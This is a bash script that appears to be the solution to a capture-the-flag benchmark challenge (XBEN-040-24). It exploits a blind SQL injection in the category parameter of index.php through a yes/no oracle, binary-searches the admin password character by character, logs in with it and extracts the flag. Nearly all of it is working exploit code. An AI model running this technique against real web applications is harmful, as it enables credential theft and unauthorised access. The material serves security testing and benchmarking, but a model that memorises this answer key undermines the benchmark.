#!/usr/bin/env bash
# XBEN-040-24 — "SQLi Exfiltration" (tags: blind_sqli)
#
# `index.php` escapes the category before using it in the query that renders the
# posts, and forgets to escape it in the query just above that checks the
# category exists. That check answers in one bit: the page renders, or it dies
# with "Category does not exist".
#
# `admin.php` is escaped properly and compares a plaintext password, so the way
# in is to read the admins table through the check and then log in for real.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben040-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/index.php" --session "$SESSION" --new --capture >/dev/null

# One yes/no question. Exits 0 for yes: the page rendered rather than dying.
ask() {
    local seq
    seq="$("$H5I" websec replay req_0 --create --reset-budget \
        --set "query.category=x' or ($1)#" \
        --session "$SESSION" |
        python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
    ! "$H5I" websec match "res_$seq" --contains 'Category does not' --session "$SESSION" >/dev/null 2>&1
}
row="select %s from admins limit 1"

ask "1=1" && ! ask "1=2" || { echo "the oracle does not answer: no injection here" >&2; exit 1; }

low=0
high=128
while [ "$low" -lt "$high" ]; do
    middle=$(((low + high) / 2))
    if ask "(select length(password) from admins limit 1)>$middle"; then
        low=$((middle + 1))
    else
        high=$middle
    fi
done
length="$low"

password=''
for position in $(seq 1 "$length"); do
    low=32
    high=126
    while [ "$low" -lt "$high" ]; do
        middle=$(((low + high) / 2))
        if ask "(select ascii(mid(password,$position,1)) from admins limit 1)>$middle"; then
            low=$((middle + 1))
        else
            high=$middle
        fi
    done
    password="$password$(printf "\\$(printf '%03o' "$low")")"
    printf '\r  password: %s' "$password" >&2
done
printf '\n' >&2

seq="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/admin.php' \
    --set 'form.username=admin' --set "form.password=$password" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
